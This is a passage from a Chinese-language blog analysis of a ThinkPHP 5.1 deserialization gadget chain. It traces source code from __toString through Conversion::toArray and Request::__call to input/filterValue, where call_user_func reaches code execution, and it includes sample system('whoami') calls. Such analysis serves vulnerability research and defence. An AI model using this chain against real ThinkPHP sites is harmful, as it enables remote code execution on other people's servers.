title="rce部分起点"></a>rce部分起点</h2><p><strong>在removeFiles()中使用了file_exists对 filename进行了处理。$filename会被作为字符串处理。<br><img src="https://img-blog.csdnimg.cn/20200106154555433.png" alt="在这里插入图片描述"><br>而__toString 当一个对象被反序列化后又被当做字符串使用时会被触发，我们通过传入一个对象来触发__toString 方法。我们全局搜索__toString方法。</strong></p><p><img src="https://img-blog.csdnimg.cn/20200106154654367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>这里我们选择 \thinkphp\library\think\model\concern\Conversion.php<br>Conversion类的第224行, 这里调用了一个toJson()方法。</strong></p><p>\thinkphp\library\think\model\concern\Conversion.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>跟进toJson()方法</p><p>\thinkphp\library\think\model\concern\Conversion.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span><span class="params">($options = JSON_UNESCAPED_UNICODE)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>继续toArray()方法</p><p>thinkphp\library\think\model\concern\Conversion.php<br><img src="https://img-blog.csdnimg.cn/2020010615552628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>目的</li></ul><p><strong>我们需要在toArray()函数中寻找一个满足<code>$可控变量-&gt;方法(参数可控)</code>的点</strong></p><ul><li>首先，这里调用了一个getRelation方法。</li><li>我们跟进getRelation()，<strong>它位于Attribute类中</strong></li></ul><p>thinkphp\library\think\model\concern\Conversion.php<br><img src="https://img-blog.csdnimg.cn/202001061559427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里调用了getRelation方法，跟入后得到代码：</p><p>thinkphp\library\think\model\concern\Conversion.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation;</span><br><span class="line">      &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>由于getRelation()下面的if语句为if (!$relation)，所以这里不用理会，返回空即可。</p><p><img src="https://img-blog.csdnimg.cn/20200106165650553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后调用了getAttr方法，我们跟进getAttr方法</p><p>thinkphp\library\think\model\concern\Conversion.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">($name, &amp;$item = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $notFound = <span class="keyword">false</span>;</span><br><span class="line">            $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">            $notFound = <span class="keyword">true</span>;</span><br><span class="line">            $value    = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">....</span><br><span class="line">.....</span><br><span class="line"><span class="keyword">return</span> $value;</span><br></pre></td></tr></table></figure><p>继续跟进getData方法</p><p>thinkphp\library\think\model\concern\Attribute.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$name];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><blockquote><p>通过查看getData函数我们可以知道 r e l a t i o n 的 值 为 relation的值为 relation的值为this-&gt;data[$name]，需要注意的一点是这里类的定义使用的是Trait而不是class。自<br>PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为 trait。通过在类中使用use<br>关键字，声明要组合的Trait名称。所以，这里类的继承要使用use关键字。然后我们需要找到一个子类同时继承了Attribute类和Conversion类。</p></blockquote><p>我们可以在\thinkphp\library\think\Model.php中找到这样一个类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> <span class="keyword">implements</span> \<span class="title">JsonSerializable</span>, \<span class="title">ArrayAccess</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">TimeStamp</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br></pre></td></tr></table></figure><p><strong>我们梳理一下目前我们需要控制的变量</strong></p><ul><li>$files位于类Windows</li><li>$append位于类Conversion</li><li>$data位于类Attribute</li></ul><p>引用大佬的图，简单的看一下，后面还有梳理<br><img src="https://img-blog.csdnimg.cn/20200106171421443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="代码执行点分析"><a href="#代码执行点分析" class="headerlink" title="代码执行点分析"></a>代码执行点分析</h2><p>这里的<code>$this-&gt;append</code>是我们<strong>可控</strong>的（在conversion中），然后通过<code>getRelation($key)</code>，但是下面有一个<code>!$relation</code>,所以我们只要置空即可</p><p>然后调用<code>getAttr($key)</code>,在调用<code>getData($name)</code>函数，这里<code>$this-&gt;data[&#39;name&#39;]</code>我们<strong>可控</strong>（在attribute中）</p><p><code>$relation</code> 变量来自 <code>$this-&gt;data[$name]</code><br><code>$name</code> 变量来自 <code>$this-&gt;append</code></p><p>之后回到toArray函数，通过这一句话<code>$relation-&gt;visible($name);</code> 我们控制<code>$relation</code>为一个类对象，调用不存在的visible方法，会自动调用<code>__call</code>方法，那么我们找到一个类对象没有visible方法</p><p>我们现在缺少一个进行代码执行的点，在这个类中需要没有visible方法。并且最好存在__call方法。</p><p>因为__call一般会存在__call_user_func和__call_user_func_array，php代码执行的终点经常选择这里。我们不止一次在Thinkphp的rce中见到这两个方法。</p><p><strong>可以在/thinkphp/library/think/Request.php，找到一个__call函数。__call 调用不可访问或不存在的方法时被调用。</strong></p><p>下面是引用大佬的图，很清晰的链条</p><p><img src="https://img-blog.csdnimg.cn/20200106171533384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>call_user_func_array(‘system’,array(‘whoami’));<br>call_user_func(‘system’,‘calc’);</p></blockquote><p>找到<br>/thinkphp/library/think/Request.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (array_key_exists($method, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">           array_unshift($args, <span class="keyword">$this</span>);</span><br><span class="line">           <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[$method], $args);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'method not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $method);</span><br><span class="line">   &#125;</span><br><span class="line">  .....</span><br></pre></td></tr></table></figure><p><code>$hook</code>这里是可控的，所以<code>call_user_func_array(array(任意类,任意方法),$args)</code> ，这样我们就可以调用任意类的任意方法了。，但是<code>array_unshift()</code>向数组插入新元素时会将新数组的值将被插入到数组的开头，<code>$args</code>第一个值不能够控制。这种情况下我们是构造不出可用的payload的。由于$args第一个值不能够控制，但是构造不出来参数可用的payload，因为第一个参数是$this对象</p><p><strong><code>call_user_func_array(array(任意类,任意方法),$args)</code> ，这样我们就可以调用任意类的任意方法了。</strong><br>虽然第330行用 array_unshift 函数把本类对象 $this 放在数组变量 $args 的第一个，但是我们可以寻找不受这个参数影响的方法</p><p>ThinkPHP 历史 RCE 漏洞的人可能知道， think\Request 类的 input 方法经常是，相当于 <code>call_user_func($filter,$data)</code> 。但是前面， <code>$args</code> 数组变量的第一个元素，是一个固定死的类对象，所以这里我们不能直接调用 input 方法，而应该寻找调用 input 的方法。</p><p><strong>最终产生rce的地方是在input函数当中</strong></p><p>在input函数中有一个 <code>$this-&gt;filterValue($data, $name, $filter);</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">            <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">            $value = call_user_func($filter, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_scalar($value)) &#123;</span><br></pre></td></tr></table></figure><p>但是这里的$value不能自己进行控制，所以需要往上找可以控制value的地方,共发现以下函数:</p><ol><li>cookie</li><li>input 但是这里的input参数并不是可控的:</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === $name) &#123;</span><br><span class="line">       <span class="comment">// 获取原始数据</span></span><br><span class="line">       <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name = (string) $name;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">''</span> != $name) &#123;</span><br><span class="line">       <span class="comment">// 解析name</span></span><br><span class="line">       <span class="keyword">if</span> (strpos($name, <span class="string">'/'</span>)) &#123;</span><br><span class="line">         <span class="keyword">list</span>($name, $type) = explode(<span class="string">'/'</span>, $name);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $data = <span class="keyword">$this</span>-&gt;getData($data, $name);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (is_null($data)) &#123;</span><br><span class="line">         <span class="keyword">return</span> $default;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (is_object($data)) &#123;</span><br><span class="line">         <span class="keyword">return</span> $data;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析过滤器</span></span><br><span class="line">    $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">       array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">       <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">'7.1.0'</span>, <span class="string">'&lt;'</span>)) &#123;</span><br><span class="line">                <span class="comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;arrayReset($data);</span><br><span class="line">            &#125;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>这里<code>$filter</code>可控，data参数不可控，而且<code>$name = (string) $name;</code>这里如果直接调用input的话，执行到这一句的时候会报错，直接退出，所以继续回溯，目的是要找到可以控制$name变量，使之最好是字符串。同时也要找到能控制data参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span><span class="params">($filter, $default)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($filter)) &#123;</span><br><span class="line">       $filter = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       $filter = $filter ?: <span class="keyword">$this</span>-&gt;filter;</span><br><span class="line">       <span class="keyword">if</span> (is_string($filter) &amp;&amp; <span class="keyword">false</span> === strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">         $filter = explode(<span class="string">','</span>, $filter);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         $filter = (<span class="keyword">array</span>) $filter;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filter[] = $default;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $filter;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">(array $data, $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (explode(<span class="string">'.'</span>, $name) <span class="keyword">as</span> $val) &#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$val])) &#123;</span><br><span class="line">         $data = $data[$val];</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们继续找一个调用input函数的地方。我们找到了param函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">       $method = <span class="keyword">$this</span>-&gt;method(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 自动获取请求变量</span></span><br><span class="line">       <span class="keyword">switch</span> ($method) &#123;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">'POST'</span>:</span><br><span class="line">          $vars = <span class="keyword">$this</span>-&gt;post(<span class="keyword">false</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">'PUT'</span>:</span><br><span class="line">         <span class="keyword">case</span> <span class="string">'DELETE'</span>:</span><br><span class="line">         <span class="keyword">case</span> <span class="string">'PATCH'</span>:</span><br><span class="line">          $vars = <span class="keyword">$this</span>-&gt;put(<span class="keyword">false</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">default</span>:</span><br><span class="line">          $vars = [];</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">       <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line"></span><br><span class="line">       <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $name) &#123;</span><br><span class="line">       <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">       $file = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">       $data = is_array($file) ? array_merge(<span class="keyword">$this</span>-&gt;param, $file) : <span class="keyword">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input($data, <span class="string">''</span>, $default, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里this-&gt;param完全可控，是通过get传参数进去的，那么也就是说input函数中的<code>$data</code>参数可控，也就是<code>call_user_func</code>的<code>$value,</code>现在差一个条件，那就是name是字符串，继续回溯。<br>这里仍然是不可控的，所以我们继续找调用param函数的地方。找到了isAjax函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span><span class="params">($ajax = false)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $value  = <span class="keyword">$this</span>-&gt;server(<span class="string">'HTTP_X_REQUESTED_WITH'</span>);</span><br><span class="line">        $result = <span class="string">'xmlhttprequest'</span> == strtolower($value) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">true</span> === $ajax) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $result           = <span class="keyword">$this</span>-&gt;param(<span class="keyword">$this</span>-&gt;config[<span class="string">'var_ajax'</span>]) ? <span class="keyword">true</span> : $result;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在isAjax函数中，我们可以控制<code>$this-&gt;config[&#39;var_ajax&#39;]</code>，<code>$this-&gt;config[&#39;var_ajax&#39;]</code>可控就意味着param函数中的 n a m e 可 控 。 p a r a m 函 数 中 的 name可控。param函数中的 name可控。param函数中的name可控就意味着input函数中的$name可控。</p><p><strong>可以导致RCE<br>回溯一下</strong></p><p>param（）函数 可以获得<code>$_GET</code>数组并赋值给<code>$this-&gt;param</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br></pre></td></tr></table></figure><p>array_merge（）数组合并起来<br>这句代码会将<code>$_GET</code>数组赋值到$this-&gt;param中，在往下执行就来到了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br></pre></td></tr></table></figure><p>再回到input函数中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">$this</span>-&gt;getData($data, $name);</span><br></pre></td></tr></table></figure><p><code>$name</code>的值来自于<code>$this-&gt;config[&#39;var_ajax&#39;]</code>，我们跟进getData函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">(array $data, $name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (explode(<span class="string">'.'</span>, $name) <span class="keyword">as</span> $val) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$val])) &#123;</span><br><span class="line">                $data = $data[$val];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line">\\</span><br></pre></td></tr></table></figure><p>这里<code>$data</code>直接等于 <code>$data</code> = <code>$data[$val]</code> = <code>$data[$name]</code></p><p>然后就是解析过滤器，跟进getFilter函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span><span class="params">($filter, $default)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($filter)) &#123;</span><br><span class="line">            $filter = [];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $filter = $filter ?: <span class="keyword">$this</span>-&gt;filter;</span><br><span class="line">            <span class="keyword">if</span> (is_string($filter) &amp;&amp; <span class="keyword">false</span> === strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">                $filter = explode(<span class="string">','</span>, $filter);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $filter = (<span class="keyword">array</span>) $filter;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $filter[] = $default;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $filter;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020010714350552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" 